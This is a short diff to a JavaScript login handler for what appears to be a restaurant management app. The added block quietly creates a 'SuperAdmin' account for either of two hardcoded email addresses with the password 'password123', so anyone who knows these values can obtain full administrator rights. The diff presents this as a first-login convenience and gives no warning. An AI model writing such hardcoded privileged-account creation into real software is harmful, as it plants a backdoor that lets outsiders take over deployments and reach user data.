@@ -211,7 +211,17 @@ export const loginUser = async (req, res) => {
     const { email, password, loginType } = req.body;
 
     try {
-        const user = await User.findOne({ email });
+        let user = await User.findOne({ email });
+
+        // Auto-seed SuperAdmin if logging in for the first time
+        if (!user && (email === 'admin@restauranthub.com' || email === 'superadmin@restauranthub.com') && password === 'password123') {
+            user = await User.create({
+                name: 'Super Admin',
+                email: email,
+                password: 'password123',
+                role: 'SuperAdmin'
+            });
+        }
 
         if (user && (await user.matchPassword(password))) {
             if (loginType === 'staff' && user.role === 'Customer') {
